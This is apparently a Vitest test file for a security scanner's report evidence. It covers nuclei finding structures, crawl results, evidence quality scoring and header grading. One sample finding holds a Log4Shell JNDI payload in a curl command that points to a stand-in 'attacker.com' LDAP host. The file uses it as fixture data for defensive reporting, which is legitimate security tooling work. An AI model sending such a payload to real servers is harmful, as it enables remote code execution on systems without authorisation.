/**
 * DI Report Evidence Integration Tests
 *
 * Tests the getReportEvidence procedure and validates that evidence data
 * is correctly structured for the enhanced DI report.
 */
import { describe, it, expect } from "vitest";

// Test the evidence data structure expected by the DI report
describe("DI Report Evidence Data Structure", () => {
  it("should define correct nuclei finding structure", () => {
    const sampleNucleiFinding = {
      id: 1,
      scanId: 100,
      templateId: "CVE-2021-44228",
      templateName: "Log4Shell RCE",
      severity: "critical",
      host: "https://example.com",
      matchedAt: "https://example.com/api/v1",
      extractedResults: "java.version=11.0.2",
      curlCommand: "curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' https://example.com/api/v1",
      nucleiCommand: "nuclei -t CVE-2021-44228.yaml -u https://example.com",
      verified: true,
      ip: "192.168.1.1",
      timestamp: Date.now(),
    };

    expect(sampleNucleiFinding).toHaveProperty("templateId");
    expect(sampleNucleiFinding).toHaveProperty("curlCommand");
    expect(sampleNucleiFinding).toHaveProperty("extractedResults");
    expect(sampleNucleiFinding).toHaveProperty("matchedAt");
    expect(sampleNucleiFinding).toHaveProperty("severity");
    expect(sampleNucleiFinding.verified).toBe(true);
  });

  it("should define correct web crawl result structure", () => {
    const sampleCrawlResult = {
      id: 1,
      scanId: 100,
      url: "https://example.com",
      statusCode: 200,
      securityHeaders: {
        "strict-transport-security": "max-age=31536000",
        "x-frame-options": "DENY",
        "content-security-policy": "default-src 'self'",
      },
      securityHeaderGrade: "A",
      detectedTechnologies: ["React", "nginx/1.21", "Node.js"],
      cookies: [
        { name: "session", httpOnly: true, secure: true, sameSite: "Strict" },
      ],
      forms: [
        { action: "/login", method: "POST", hasPasswordField: true },
      ],
      exposedPaths: ["/admin", "/.env", "/wp-admin"],
      tlsInfo: {
        protocol: "TLSv1.3",
        cipher: "TLS_AES_256_GCM_SHA384",
        validFrom: "2024-01-01",
        validTo: "2025-01-01",
        issuer: "Let's Encrypt",
      },
    };

    expect(sampleCrawlResult).toHaveProperty("securityHeaders");
    expect(sampleCrawlResult).toHaveProperty("securityHeaderGrade");
    expect(sampleCrawlResult).toHaveProperty("detectedTechnologies");
    expect(sampleCrawlResult).toHaveProperty("exposedPaths");
    expect(sampleCrawlResult).toHaveProperty("tlsInfo");
    expect(sampleCrawlResult.securityHeaderGrade).toBe("A");
  });

  it("should define correct scan result (tool execution) structure", () => {
    const sampleScanResult = {
      id: 1,
      engagementId: 100,
      tool: "nuclei",
      command: "nuclei -t cves/ -u https://example.com -json",
      exitCode: 0,
      durationMs: 45000,
      rawOutput: "[2024-01-15] [CVE-2021-44228] [critical] https://example.com/api",
      findings: ["CVE-2021-44228 detected at /api"],
      phase: "scanning",
      executedAt: Date.now(),
    };

    expect(sampleScanResult).toHaveProperty("tool");
    expect(sampleScanResult).toHaveProperty("command");
    expect(sampleScanResult).toHaveProperty("rawOutput");
    expect(sampleScanResult).toHaveProperty("exitCode");
    expect(sampleScanResult).toHaveProperty("durationMs");
    expect(sampleScanResult.exitCode).toBe(0);
  });

  it("should handle empty evidence data gracefully", () => {
    const emptyEvidence = {
      nucleiFindings: [],
      webCrawlResults: [],
      scanResults: [],
    };

    expect(emptyEvidence.nucleiFindings).toHaveLength(0);
    expect(emptyEvidence.webCrawlResults).toHaveLength(0);
    expect(emptyEvidence.scanResults).toHaveLength(0);
  });

  it("should handle null/undefined evidence data gracefully", () => {
    const nullEvidence: any = undefined;

    // The report should work without evidence data
    const nucleiCount = nullEvidence?.nucleiFindings?.length || 0;
    const crawlCount = nullEvidence?.webCrawlResults?.length || 0;
    const toolRuns = nullEvidence?.scanResults?.length || 0;

    expect(nucleiCount).toBe(0);
    expect(crawlCount).toBe(0);
    expect(toolRuns).toBe(0);
  });
});

describe("Evidence Quality Assessment", () => {
  it("should calculate evidence quality as HIGH when >5 verified nuclei findings", () => {
    const nucleiFindings = Array.from({ length: 8 }, (_, i) => ({
      id: i,
      verified: true,
      templateId: `CVE-2024-000${i}`,
    }));

    const nucleiVerified = nucleiFindings.filter((n) => n.verified).length;
    const quality = nucleiVerified > 5 ? "HIGH" : nucleiVerified > 0 ? "MODERATE" : "PASSIVE ONLY";

    expect(quality).toBe("HIGH");
  });

  it("should calculate evidence quality as MODERATE when 1-5 verified nuclei findings", () => {
    const nucleiFindings = Array.from({ length: 3 }, (_, i) => ({
      id: i,
      verified: true,
      templateId: `CVE-2024-000${i}`,
    }));

    const nucleiVerified = nucleiFindings.filter((n) => n.verified).length;
    const quality = nucleiVerified > 5 ? "HIGH" : nucleiVerified > 0 ? "MODERATE" : "PASSIVE ONLY";

    expect(quality).toBe("MODERATE");
  });

  it("should calculate evidence quality as PASSIVE ONLY when no verified nuclei findings", () => {
    const nucleiFindings: any[] = [];

    const nucleiVerified = nucleiFindings.filter((n) => n.verified).length;
    const quality = nucleiVerified > 5 ? "HIGH" : nucleiVerified > 0 ? "MODERATE" : "PASSIVE ONLY";

    expect(quality).toBe("PASSIVE ONLY");
  });
});

describe("Evidence Matching Logic", () => {
  it("should match nuclei findings to CVEs by templateId", () => {
    const nucleiFindings = [
      { templateId: "CVE-2021-44228", host: "https://example.com", severity: "critical", curlCommand: "curl ..." },
      { templateId: "CVE-2023-1234", host: "https://example.com", severity: "high", curlCommand: "curl ..." },
      { templateId: "http-missing-security-headers", host: "https://example.com", severity: "info", curlCommand: null },
    ];

    // The DI report matches nuclei findings to vulnerability observations by CVE
    const targetCve = "CVE-2021-44228";
    const matchingEvidence = nucleiFindings.filter(
      (nf) => nf.templateId === targetCve || nf.templateId.includes(targetCve)
    );

    expect(matchingEvidence).toHaveLength(1);
    expect(matchingEvidence[0].severity).toBe("critical");
    expect(matchingEvidence[0].curlCommand).toBe("curl ...");
  });

  it("should match nuclei findings to observations by host URL", () => {
    const nucleiFindings = [
      { templateId: "CVE-2021-44228", host: "https://target.example.com", matchedAt: "https://target.example.com/api" },
      { templateId: "CVE-2023-5678", host: "https://other.example.com", matchedAt: "https://other.example.com/login" },
    ];

    const targetHost = "target.example.com";
    const matchingEvidence = nucleiFindings.filter(
      (nf) => nf.host.includes(targetHost) || nf.matchedAt?.includes(targetHost)
    );

    expect(matchingEvidence).toHaveLength(1);
    expect(matchingEvidence[0].templateId).toBe("CVE-2021-44228");
  });

  it("should handle findings without curlCommand gracefully", () => {
    const finding = { templateId: "tech-detect", host: "https://example.com", curlCommand: null, extractedResults: null };

    // Evidence rendering should skip curl block when curlCommand is null
    const hasCurl = !!finding.curlCommand;
    const hasExtracted = !!finding.extractedResults;

    expect(hasCurl).toBe(false);
    expect(hasExtracted).toBe(false);
  });
});

describe("Security Header Grading", () => {
  it("should identify missing critical headers", () => {
    const headers: Record<string, string> = {
      "x-frame-options": "DENY",
      // Missing: strict-transport-security, content-security-policy, x-content-type-options
    };

    const criticalHeaders = [
      "strict-transport-security",
      "content-security-policy",
      "x-content-type-options",
      "x-frame-options",
    ];

    const missing = criticalHeaders.filter((h) => !headers[h]);
    expect(missing).toContain("strict-transport-security");
    expect(missing).toContain("content-security-policy");
    expect(missing).toContain("x-content-type-options");
    expect(missing).not.toContain("x-frame-options");
  });

  it("should grade headers based on presence", () => {
    const gradeHeaders = (headers: Record<string, string>) => {
      const criticalHeaders = [
        "strict-transport-security",
        "content-security-policy",
        "x-content-type-options",
        "x-frame-options",
        "referrer-policy",
        "permissions-policy",
      ];
      const present = criticalHeaders.filter((h) => headers[h]);
      const ratio = present.length / criticalHeaders.length;
      if (ratio >= 0.9) return "A";
      if (ratio >= 0.7) return "B";
      if (ratio >= 0.5) return "C";
      if (ratio >= 0.3) return "D";
      return "F";
    };

    expect(gradeHeaders({
      "strict-transport-security": "max-age=31536000",
      "content-security-policy": "default-src 'self'",
      "x-content-type-options": "nosniff",
      "x-frame-options": "DENY",
      "referrer-policy": "strict-origin",
      "permissions-policy": "camera=()",
    })).toBe("A");

    expect(gradeHeaders({
      "x-frame-options": "DENY",
    })).toBe("F");
  });
});
